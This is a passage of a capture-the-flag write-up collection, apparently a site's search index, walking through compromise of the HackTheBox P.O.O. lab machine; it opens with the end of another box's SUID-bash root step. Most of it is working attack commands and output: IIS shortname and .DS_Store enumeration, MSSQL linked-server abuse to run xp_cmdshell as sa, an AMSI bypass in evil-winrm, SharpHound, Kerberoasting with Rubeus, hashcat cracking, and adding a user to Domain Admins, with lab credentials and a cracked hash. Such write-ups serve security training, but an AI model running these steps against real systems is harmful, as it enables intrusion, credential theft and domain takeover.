/bin/bash\n...\n</code></pre> <p>When the Cronjob we saw before is executed, the <code>root</code> user will change <code>/bin/bash</code> to be a SUID binary. That means we have rooted the machine!</p> <pre><code>dev01@opensource:~$ bash -p\nbash-4.4#\n</code></pre> <p>The flag is under <code>/root/root.txt</code>.</p>"},{"location":"HackTheBox/P.O.O./","title":"P.O.O.","text":""},{"location":"HackTheBox/P.O.O./#nmap-scan","title":"Nmap scan","text":"<pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p-  --min-rate 1000 10.13.38.11\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-12 11:34 EDT\nNmap scan report for 10.13.38.11\nHost is up (0.057s latency).\nNot shown: 65533 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n80/tcp   open  http\n1433/tcp open  ms-sql-s\n\nNmap done: 1 IP address (1 host up) scanned in 102.34 seconds\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ sudo nmap -p80,1433 10.13.38.11 -sC -sV\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-06-12 11:42 EDT\nNmap scan report for 10.13.38.11\nHost is up (0.057s latency).\n\nPORT     STATE SERVICE  VERSION\n80/tcp   open  http     Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2027.00; RTM+\n| ms-sql-ntlm-info: \n|   Target_Name: POO\n|   NetBIOS_Domain_Name: POO\n|   NetBIOS_Computer_Name: COMPATIBILITY\n|   DNS_Domain_Name: intranet.poo\n|   DNS_Computer_Name: COMPATIBILITY.intranet.poo\n|   DNS_Tree_Name: intranet.poo\n|_  Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2022-06-09T23:08:45\n|_Not valid after:  2052-06-09T23:08:45\n|_ssl-date: 2022-06-12T15:42:38+00:00; +7s from scanner time.\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 7s, deviation: 0s, median: 6s\n| ms-sql-info: \n|   10.13.38.11:1433: \n|     Version: \n|       name: Microsoft SQL Server 2017 RTM+\n|       number: 14.00.2027.00\n|       Product: Microsoft SQL Server 2017\n|       Service pack level: RTM\n|       Post-SP patches applied: true\n|_    TCP port: 1433\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.50 seconds\n</code></pre> <p>Only 2 ports open, a website (port 80) and a SQL server (port 1433). Let' start with the website.</p>"},{"location":"HackTheBox/P.O.O./#iss-server","title":"ISS server","text":"<p>After trying some wordlist to enumerate the web server, I found something interesting using a wordlist of file names:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ gobuster dir -u http://10.13.38.11/ -w Wordlists/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt \n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.13.38.11/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                Wordlists/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/06/12 14:09:27 Starting gobuster in directory enumeration mode\n===============================================================\n/.                    (Status: 200) [Size: 703]\n/.ds_store            (Status: 200) [Size: 10244]\n/iisstart.htm         (Status: 200) [Size: 703]  \n/.trashes             (Status: 301) [Size: 151] [--&gt; http://10.13.38.11/.trashes/]\n===============================================================\n2022/06/12 14:12:00 Finished\n===============================================================\n</code></pre> <p>That <code>.ds_store</code> file can leak information about the contents in the directory, I found a little tool in Python to parse the file: https://github.com/gehaxelt/Python-dsstore. It is a bit buggy and repeat files but hey, enough for me, these are the contents in the root directory:</p> <pre><code>Contents on /\n\nadmin\ndev\niisstart.htm\nImages\nJS\nMETA-INF\nNew folder\nNew folder (2)\nPlugins\nTemplates\nThemes\nUploads\nweb.config\nWidgets\n</code></pre> <p>Looks like there are <code>.ds_store</code> files in every directory so time to enumerate:</p> <pre><code>Contents on /dev\n\n304c0c90fbc6520610abbf378e2339d1\ndca66d38fd916317687e1390a420c3fc\n-------------------------------------------------\nContents on /dev/304c0c90fbc6520610abbf378e2339d1\n\ncore\ndb\ninclude\nsrc\n-------------------------------------------------\nContents on /dev/dca66d38fd916317687e1390a420c3fc\n\ncore\ndb\ninclude\nsrc\n</code></pre> <p>Cool, I tried to bruteforce the files inside both <code>db</code> folders to check for credentials but no luck. After researching a bit I found something interesting in Hacktricks, if the server is vulnerable maybe we can get an idea an idea of how the filenames in every directory are called.</p> <p>The tool suggested is in Java so I search for something in Python, I found this: https://github.com/lijiejie/IIS_shortname_Scanner:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/poo/IIS_shortname_Scanner]\n\u2514\u2500$ python2 iis_shortname_Scan.py http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db             \nServer is vulnerable, please wait, scanning...\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/p~1.*      [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/po~1.*     [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo~1.*    [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_~1.*   [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_c~1.*  [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.* [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.t*        [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.tx*       [scan in progress]\n[+] /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*      [scan in progress]\n[+] File /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt* [Done]\n----------------------------------------------------------------\nFile: /dev/dca66d38fd916317687e1390a420c3fc/db/poo_co~1.txt*\n----------------------------------------------------------------\n0 Directories, 1 Files found in total\nNote that * is a wildcard, matches any character zero or more times.\n</code></pre> <p>Ok! We now know that there is a file that starts by <code>poo_co</code> and the extention is <code>.txt</code>. Let's fuzz it! I took the only words starting with <code>co</code> from the <code>SecLists/Discovery/Web-Content/raft-large-words.txt</code> wordlist:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/poo]\n\u2514\u2500$ wfuzz -w cutom_wordlist.txt --hs 404  http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_FUZZ.txt\nTotal requests: 2224\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                            \n=====================================================================\n\n000000096:   200        6 L      7 W        142 Ch      \"connection\"                                       \n\nTotal time: 0\nProcessed Requests: 2224\nFiltered Requests: 2223\nRequests/sec.: 0\n</code></pre> <p>Visiting <code>http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/poo_connection.txt</code> will show the <code>Recon</code> flag and also the credentials for the database:</p> <pre><code>SERVER=10.13.38.11\nUSERID=external_user\nDBNAME=POO_PUBLIC\nUSERPWD=#p00Public3xt3rnalUs3r#\n</code></pre>"},{"location":"HackTheBox/P.O.O./#sql-server","title":"SQL server","text":"<p>I was able to connect to the SQL server:</p> <pre><code>\u250c\u2500\u2500(venv)\u2500(kali\u327fkali)-[~/Desktop/poo]\n\u2514\u2500$ mssql-cli -U external_user -P \"#p00Public3xt3rnalUs3r#\" -S 10.13.38.11,1433\nmaster&gt;\n</code></pre> <p>But I couldn't execute any command, I did some enumeration but I was not really lucky because the user has very limited permissions:</p> <pre><code>master&gt; select name from sys.databases                                                                              \nTime: 0.517s\n+------------+\n| name       |\n|------------|\n| master     |\n| tempdb     |\n| POO_PUBLIC |\n+------------+\n(3 rows affected)\nmaster&gt; SELECT * from INFORMATION_SCHEMA.TABLES                                                                     \nTime: 0.513s\n+-----------------+----------------+------------------+--------------+\n| TABLE_CATALOG   | TABLE_SCHEMA   | TABLE_NAME       | TABLE_TYPE   |\n|-----------------+----------------+------------------+--------------|\n| master          | dbo            | spt_fallback_db  | BASE TABLE   |\n| master          | dbo            | spt_fallback_dev | BASE TABLE   |\n| master          | dbo            | spt_fallback_usg | BASE TABLE   |\n| master          | dbo            | spt_values       | VIEW         |\n| master          | dbo            | spt_monitor      | BASE TABLE   |\n+-----------------+----------------+------------------+--------------+\n\nmaster&gt; SELECT name FROM syslogins;                                                                                 \nTime: 0.506s\n+---------------+\n| name          |\n|---------------|\n| sa            |\n| external_user |\n+---------------+\n(2 rows affected)\n\nmaster&gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, 'SERVER');                                 \nTime: 0.588s\n+---------------+-------------------+\n| entity_name   | permission_name   |\n|---------------+-------------------|\n| server        | CONNECT SQL       |\n+---------------+-------------------+\n</code></pre> <p>After researching a bit I found information about linked servers. Looks like you can setup external databases to extract data from, let's see if the server is using this feature:</p> <pre><code>master&gt; EXECUTE sp_linkedservers                                                                                    \nTime: 0.668s\n+--------------------------+--------------------+---------------+--------------------------+----------------------+&gt;\n| SRV_NAME                 | SRV_PROVIDERNAME   | SRV_PRODUCT   | SRV_DATASOURCE           | SRV_PROVIDERSTRING   |&gt;\n|--------------------------+--------------------+---------------+--------------------------+----------------------+&gt;\n| COMPATIBILITY\\POO_CONFIG | SQLNCLI            | SQL Server    | COMPATIBILITY\\POO_CONFIG | NULL                 |&gt;\n| COMPATIBILITY\\POO_PUBLIC | SQLNCLI            | SQL Server    | COMPATIBILITY\\POO_PUBLIC | NULL                 |&gt;\n+--------------------------+--------------------+---------------+--------------------------+----------------------+&gt;\n(2 rows affected)\n\nmaster&gt; select @@servername                                                                                                                                     \nTime: 0.666s\n+--------------------------+\n| (No column name)         |\n|--------------------------|\n| COMPATIBILITY\\POO_PUBLIC |\n+--------------------------+\n(1 row affected)\n</code></pre> <p>Cool, so we have a SQL server linked (It shows 2 but one of them is the server we are in).</p>"},{"location":"HackTheBox/P.O.O./#rce","title":"RCE","text":"<p>I tried to execute some commands in the linked server:</p> <pre><code>master&gt; EXECUTE ('select SUSER_NAME();') at [COMPATIBILITY\\POO_CONFIG]                                                                                          \nTime: 0.634s\n+--------------------+\n| (No column name)   |\n|--------------------|\n| internal_user      |\n+--------------------+\n(1 row affected)\n</code></pre> <p>We can see that the commands are being executed by <code>internal_user</code> in <code>COMPATIBILITY\\POO_CONFIG</code>. I tried to connect to <code>COMPATIBILITY\\POO_PUBLIC</code> through <code>COMPATIBILITY\\POO_CONFIG</code> to see what user is executing the commands that way:</p> <pre><code>master&gt; EXECUTE ('EXECUTE (''select SUSER_NAME();'') at [COMPATIBILITY\\POO_PUBLIC]') at [COMPATIBILITY\\POO_CONFIG]                                              \nTime: 0.608s\n+--------------------+\n| (No column name)   |\n|--------------------|\n| sa                 |\n+--------------------+\n(1 row affected)\n</code></pre> <p>Oh, that is nice. Looks like we can execute command as the <code>sa</code> user so maybe we can use <code>xp_cmdshell</code> now?</p> <pre><code>master&gt; EXECUTE ('EXECUTE (''xp_cmdshell whoami'') at [COMPATIBILITY\\POO_PUBLIC]') at [COMPATIBILITY\\POO_CONFIG]                                                \nTime: 0.849s\n+-----------------------------+\n| output                      |\n|-----------------------------|\n| nt service\\mssql$poo_public |\n| NULL                        |\n+-----------------------------+\n(2 rows affected)\n</code></pre> <p>Yeah we can! Also we have now access to a database called <code>flag</code>. You can guess what is in there right? Before following with the next steps I changed the <code>sa</code> user password to avoid the pivoting part and ease the commands syntax: </p> <pre><code>master&gt; EXECUTE ('EXECUTE (''ALTER LOGIN [sa] WITH PASSWORD=N''''idkwhat2puth3re.'''' '') at [COMPATIBILITY\\POO_PUBLIC]') at [COMPATIBILITY\\POO_CONFIG]                                                                                      \nTime: 0.322s\nCommands completed successfully.\n</code></pre> <p>Now we are able to execute commands directly:</p> <pre><code>master&gt; xp_cmdshell 'whoami'                                                                                                                                                                                                                 \nTime: 1.213s (a second)\n+-----------------------------+\n| output                      |\n|-----------------------------|\n| nt service\\mssql$poo_public |\n| NULL                        |\n+-----------------------------+\n(2 rows affected)\n</code></pre>"},{"location":"HackTheBox/P.O.O./#privilege-scalation","title":"Privilege scalation","text":"<p>The user we can execute commands as is pretty limitted and we can't even get access to some of the important files in the webserver as <code>\\inetput\\wwwroot\\web.config</code>. The thing is that looks like <code>sp_execute_external_script</code> is installed so maybe it is being executed as a different user:</p> <pre><code>master&gt; EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'                                                                                                                        \nTime: 8.474s (8 seconds)\nSTDOUT message(s) from external script: \n\nExpress Edition will continue to be enforced.\nPOO_PUBLIC01\n</code></pre> <p>Confirmed, we can execute commands as the <code>POO_PUBLIC01</code> user. Now we can read the <code>web.config</code> file:</p> <pre><code>master&gt; EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"type C:\\\\inetpub\\wwwroot\\web.config\"))'                                                           \nTime: 0.625s\nSTDOUT message(s) from external script: \n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;configuration&gt;\n    &lt;system.webServer&gt;\n        &lt;staticContent&gt;\n            &lt;mimeMap\n                fileExtension=\".DS_Store\"\n                mimeType=\"application/octet-stream\"\n            /&gt;\n        &lt;/staticContent&gt;\n        &lt;!--\n        &lt;authentication mode=\"Forms\"&gt;\n            &lt;forms name=\"login\" loginUrl=\"/admin\"&gt;\n                &lt;credentials passwordFormat = \"Clear\"&gt;\n                    &lt;user \n                        name=\"Administrator\" \n                        password=\"EverybodyWantsToWorkAtP.O.O.\"\n                    /&gt;\n                &lt;/credentials&gt;\n            &lt;/forms&gt;\n        &lt;/authentication&gt;\n        --&gt;\n    &lt;/system.webServer&gt;\n&lt;/configuration&gt;\n</code></pre> <p>With the credentials in there, I can access the <code>/admin</code> page and get another flag.</p>"},{"location":"HackTheBox/P.O.O./#getting-a-shell","title":"Getting a shell","text":"<p>Right now we are stuck in the SQL server console, I tried some Python reverse shells but no luck. Maybe Im doing something wrong (Probably) or there is a firewall in place or something that avoid reverse shells to work. I checked the open ports in the machine:</p> <pre><code>master&gt; xp_cmdshell 'ipconfig'                                                                                      \nTime: 0.519s\n+-----------------------------------------------------------------------+\n| output                                                                |\n|-----------------------------------------------------------------------|\n| NULL                                                                  |\n| Windows IP Configuration                                              |\n| NULL                                                                  |\n| NULL                                                                  |\n| Ethernet adapter Ethernet1:                                           |\n| NULL                                                                  |\n|    Connection-specific DNS Suffix  . :                                |\n|    IPv4 Address. . . . . . . . . . . : 172.20.128.101                 |\n|    Subnet Mask . . . . . . . . . . . : 255.255.255.0                  |\n|    Default Gateway . . . . . . . . . :                                |\n| NULL                                                                  |\n| Ethernet adapter Ethernet0:                                           |\n| NULL                                                                  |\n|    Connection-specific DNS Suffix  . : htb                            |\n|    IPv6 Address. . . . . . . . . . . : dead:beef::250                 |\n|    IPv6 Address. . . . . . . . . . . : dead:beef::1001                |\n|    IPv6 Address. . . . . . . . . . . : dead:beef::f1f1:2ba7:c0ab:1b02 |\n|    Link-local IPv6 Address . . . . . : fe80::f1f1:2ba7:c0ab:1b02%5    |\n|    IPv4 Address. . . . . . . . . . . : 10.13.38.11                    |\n|    Subnet Mask . . . . . . . . . . . : 255.255.255.0                  |\n|    Default Gateway . . . . . . . . . : dead:beef::1                   |\n|                                        fe80::250:56ff:feb9:1f8d%5     |\n|                                        10.13.38.2                     |\n| NULL                                                                  |\n+-----------------------------------------------------------------------+\n(24 rows affected)\nmaster&gt; xp_cmdshell 'netstat -ano'                                                                                  \nTime: 0.538s\n+-----------------------------------------------------------------------------+\n| output                                                                      |\n|-----------------------------------------------------------------------------|\n| NULL                                                                        |\n| Active Connections                                                          |\n| NULL                                                                        |\n|   Proto  Local Address          Foreign Address        State           PID  |\n|   TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4    |\n|   TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920  |\n|   TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4    |\n|   TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       4828 |\n|   TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING       4    |\n|   TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4    |\n|   TCP    0.0.0.0:41433          0.0.0.0:0              LISTENING       4804 |\n|   TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4    |\n|   TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       488  |\n|   TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1156 |\n|   TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1636 |\n|   TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       644  |\n|   TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       2368 |\n|   TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       644  |\n|   TCP    0.0.0.0:49680          0.0.0.0:0              LISTENING       632  |\n|   TCP    10.13.38.11:139        0.0.0.0:0              LISTENING       4    |\n|   TCP    10.13.38.11:1433       10.10.14.3:35954       ESTABLISHED     4828 |\n|   TCP    10.13.38.11:1433       10.10.14.3:41126       ESTABLISHED     4828 |\n|   TCP    10.13.38.11:1433       10.10.14.3:41136       ESTABLISHED     4828 |\n|   TCP    127.0.0.1:49679        0.0.0.0:0              LISTENING       4828 |\n|   TCP    127.0.0.1:50280        0.0.0.0:0              LISTENING       4828 |\n|   TCP    127.0.0.1:50311        0.0.0.0:0              LISTENING       4804 |\n|   TCP    172.20.128.101:139     0.0.0.0:0              LISTENING       4    |\n|   TCP    [::]:80                [::]:0                 LISTENING       4    |\n|   TCP    [::]:135               [::]:0                 LISTENING       920  |\n|   TCP    [::]:445               [::]:0                 LISTENING       4    |\n|   TCP    [::]:1433              [::]:0                 LISTENING       4828 |\n|   TCP    [::]:5357              [::]:0                 LISTENING       4    |\n|   TCP    [::]:5985              [::]:0                 LISTENING       4    |\n|   TCP    [::]:41433             [::]:0                 LISTENING       4804 |\n|   TCP    [::]:47001             [::]:0                 LISTENING       4    |\n|   TCP    [::]:49664             [::]:0                 LISTENING       488  |\n|   TCP    [::]:49665             [::]:0                 LISTENING       1156 |\n|   TCP    [::]:49666             [::]:0                 LISTENING       1636 |\n|   TCP    [::]:49667             [::]:0                 LISTENING       644  |\n|   TCP    [::]:49668             [::]:0                 LISTENING       2368 |\n|   TCP    [::]:49669             [::]:0                 LISTENING       644  |\n|   TCP    [::]:49680             [::]:0                 LISTENING       632  |\n|   TCP    [::1]:50280            [::]:0                 LISTENING       4828 |\n|   TCP    [::1]:50311            [::]:0                 LISTENING       4804 |\n...\n</code></pre> <p>Wait, there are a lot of ports that were not reported by Nmap because are open in IPV6. One of those ports is 5985 what normally is WinRM. Maybe we can connect to it using the credentials we found in the <code>web.config</code> files?</p> <p>I added the domain <code>COMPATIBILITY.intranet.poo</code> we got in the Nmap scan we did at the beginning to my <code>hosts</code> file. About the IP address I used for the domain, I had a little try and error moment because the <code>netstat</code> command resported more than one IPV6 address (<code>dead:beef::1001</code> was the good one):</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ evil-winrm -i COMPATIBILITY.intranet.poo -u Administrator -p EverybodyWantsToWorkAtP.O.O.\n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;\n</code></pre> <p>As you can see, I used the same credentials used for the admin panel. We can now get a new flag under <code>Administrator</code> desktop.</p>"},{"location":"HackTheBox/P.O.O./#p00ned","title":"p00ned","text":"<p>Time to enumerate the active directory, only one thing to keep in mind: </p> <pre><code>*Evil-WinRM* PS C:\\Users\\Public&gt; whoami\ncompatibility\\administrator\n</code></pre> <p>We can't query information about the domain from a local administrator account. However, the SQL is a service account and it can do it. The service accounts impersonate the computer account, which is member of the domain and we can consider it as a special type of user account.</p> <p>Let's upload SharpHound to the machine, make sure you use <code>C:\\Users\\Public</code> directory to allow the SQL service account access the executable:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Public&gt; upload /home/kali/Desktop/poo/tools/BloodHound/Collectors/SharpHound.exe C:\\Users\\Public\\s.exe\nInfo: Uploading /home/kali/Desktop/poo/tools/BloodHound/Collectors/SharpHound.exe to C:\\Users\\Public\\s.exe\n\n\nData: 1209000 bytes of 1209000 bytes copied\n\nInfo: Upload successful!\n</code></pre> <p>Cool, time to use the SQL shell again to execute SharpHound:</p> <pre><code>master&gt; xp_cmdshell 'C:\\Users\\Public\\s.exe -C All --outputdirectory C:\\Users\\Public'\n</code></pre> <p>After a while, the shell returns the command result and we are able to download the zip file with all the information we will need to find a good attack vector:</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Public&gt; download C:\\Users\\Public\\20220613043033_BloodHound.zip /home/kali/BloodHound.zip\nInfo: Downloading C:\\Users\\Public\\20220613043033_BloodHound.zip to /home/kali/BloodHound.zip\n\n\nInfo: Download successful!\n</code></pre> <p>We can now open Bloodhound and look for potential users than can lead us to domain admin. Luckily for us, this is not too hard:</p> <p></p> <p>As you can see, the user <code>p00_adm</code> is a good candidate.</p>"},{"location":"HackTheBox/P.O.O./#asreproasting","title":"ASREPRoasting","text":"<p>Maybe we can get a TGT of the user and crack its hash offline, we can use Rubeus for this. As we did before, upload the tool and then execute it using the SQL shell (Remember we are still in the local admin account):</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Public&gt; upload /home/kali/Desktop/poo/tools/Rubeus.exe C:\\Users\\Public\\Rubeus.exe\nInfo: Uploading /home/kali/Desktop/poo/tools/Rubeus.exe to C:\\Users\\Public\\Rubeus.exe\n\n\nData: 574804 bytes of 574804 bytes copied\n\nInfo: Upload successful! \n</code></pre> <pre><code>master&gt; xp_cmdshell 'C:\\Users\\Public\\Rubeus.exe kerberoast /user:p00_adm'\n</code></pre> <p>After executing the above, we are able to get the <code>p00_adm</code> password hash. At this point the obvious step is to crack it, the thing is that a typical dictionary as Rockyou won't work. I was able to get the job done with the wordlist <code>Keyboard-Combinations.txt</code> from SecLists:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/poo]\n\u2514\u2500$ hashcat -a 0 hashes /home/kali/Wordlists/SecLists/Passwords/Keyboard-Combinations.txt --force\nhashcat (v6.2.5) starting in autodetect mode\n\n...\n\n$krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443@intranet.poo*$b8814234e0701884db25071f34d6fdef$971246d033e9c1a9081851df54995ab4f7f59bef16050e13d3630ef5fa897bb9dafd2a4c31aad6b5fcf85b41cfa30d4fd687a2b1aac1cf634809679309556022fb162b062cccb81c5e6f6411c369016793954d668f46327b8e1539dd0d085edf30b597614f5e05af253961bc88e8f335a3ebed85e3a99c1f67b3abea703515b18e0e367c8786eaa11f0382a974f6566116da8ff29e9b4797262bd5716883f1e4bc8175c631a21f20d807c6290b45477e2326c7efb716220ecdc9119f845aa4a1564414686701b160387641dfd97fa409ef2237afd3c54bcecb8d9feb1300022b3c4e2bd50ac4143df41832c17e131bbb77e54a43e544da513d45df5d221335c0cd518cdac93fde4ccc01cc1f2b720f27ac6d0d9f2a28c6d818228a4b365c98ae724b3b00eacffb01b83854dd4a792de2e9a6e9ffe298c4f3be352fcf55ab2cc2ba13a55951ff6d53bbccdb9073c14d84160246da1dab50ff005c4bbc4481d7acdfe3fdc85a4da233d35167163a68319ec2290381180661286ac47561585d1d782b6606a055d0bc3b0869698429efe5c451bba4e9c026349512f889e8c2e799abdb894e797eb91c6f73471df73f8e20cdf1c2bfe421efde8e988d1b9b29d0485f8e87e89903ba729ea63a5e3d6bf0ad2a19c691d88511ecbaa63930b5bc60fc766ffbc3a88d4cf2e1aee3a05eb2c5f91097d98edd3ecdc9c5dd67e8255ddb36090a7532fa36409c464bb7fa930dac561df00c5e05c82ee0e8e178cf92e39dc58d4b6318aecbfd699e87c3dedee8c8c0e646a37ea2c91c0b2211a331dfda5e2d5398baa973202f63340efe661a05c708e182f01893452a05826d9ea11168c47ca2ad1e7b564a18d6ec534556d1eae4f75444e28d6c533216738f725a5dff5c03c843dde8ca55b8e22d6f37437c2677c8782acd3710536625cb82cf403085acf54e651719038149f14266db2ea1065ebae8c0f0bf3149a3a2997e391373f6cff68fe31ec572c280c1c06afbe7e27c1c62e8e9a42261d2093ac739b29c46e1fc9144319cf7daa8402eeeae5bcc08f73af3e8253d0af67d88853328ca1778cc7dbd1bbd9e693b48b3bec617ee931cb395f948737213fdaf487513b257e77881a99ef72d77db5d8c9b6f0465003bb10a912c9912151c67b6d9045251f0b50e83f2bc4abe3bd00f14ea75e2272cb3b645386b24890b557c1a4a9c7e46556756b48b46234c0c0de81cc6bb89d3ffb041d7680a64cd70dd3a11accbfedcbb5aed7dbde0057202480886a24870902b1cbea4b82a7b86ad7d5e2ca4312df4b80ba019d41b005e099f68ad3f28422f9d2725ae73bc49e1d3c44b8657c4195c9bc3a97655b94b8adfe7732049e05d8037b0965815da57adeb16a31a6c29bbf987b2e06e646411ed90b5d9078330708f0f6fa0c5d3620e6efdfb8a726b35a94b4fd98a257f015903d6a755ca38d62025576795db697e32fbf49cdde13149c72de09847c3:ZQ!5t4r\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\nHash.Target......: $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intra...9847c3\nTime.Started.....: Sun Jun 12 22:03:48 2022, (0 secs)\nTime.Estimated...: Sun Jun 12 22:03:48 2022, (0 secs)\nKernel.Feature...: Pure Kernel\nGuess.Base.......: File (/home/kali/Wordlists/SecLists/Passwords/Keyboard-Combinations.txt)\nGuess.Queue......: 1/1 (100.00%)\nSpeed.#1.........:  2911.0 kH/s (0.74ms) @ Accel:512 Loops:1 Thr:1 Vec:8\nRecovered........: 1/1 (100.00%) Digests\nProgress.........: 4096/9604 (42.65%)\nRejected.........: 0/4096 (0.00%)\nRestore.Point....: 0/9604 (0.00%)\nRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\nCandidate.Engine.: Device Generator\nCandidates.#1....: zaq1zaq1 -&gt; ()+_T%R$\nHardware.Mon.#1..: Util: 11%\n\nStarted: Sun Jun 12 22:03:47 2022\nStopped: Sun Jun 12 22:03:50 2022\n</code></pre> <p>Cool, we have the credentials we needed to escalate to domain admin: <code>p00_adm:ZQ!5t4r</code>. In order to achieve our goal, I used PowerView to help with all the Active Directory related commands. Since Evil Winrm can load powershell scripts if you specify a path to load them from, integrating Powerview is pretty easy:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ evil-winrm -i COMPATIBILITY.intranet.poo -u Administrator -p EverybodyWantsToWorkAtP.O.O. -s /home/kali/Desktop/poo/tools \n\nEvil-WinRM shell v3.3\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine\n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Bypass-4MSI\n[+] Success!\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; PowerView.ps1\n</code></pre> <p>In order to authenticate as <code>p00_adm</code> and do our stuff, we need to create a credential object first. Then, we can add ourselves to Domain Admins (<code>Add-DomainGroupMember</code> and <code>Get-DomainUser</code> commands are part of Powerview):</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; $pass= ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; $cred= New-Object System.Management.Automation.PSCredential('intranet.poo\\p00_adm', $pass)\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Get-DomainUser p00_adm -Credential $cred\n...\nserviceprincipalname          : cyber_audit/intranet.poo:443\nmemberof                      : {CN=P00 Help Desk,CN=Users,DC=intranet,DC=poo, CN=Domain Admins,CN=Users,DC=intranet,DC=poo}\nwhencreated                   : 3/21/2018 7:07:23 PM\nbadpwdcount                   : 0\ncn                            : p00_adm\nuseraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\n...\n</code></pre> <p>As you can see, <code>p00_adm</code> is now a domain admin so we can now execute commands in the domain controller and obviously get the flag!</p> <pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Invoke-Command -Computer DC -Credential $cred -ScriptBlock { whoami }\npoo\\p00_adm\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; Invoke-Command -Computer DC -Credential $cred -ScriptBlock { type ..\\..\\mr3ks\\Desktop\\flag.txt 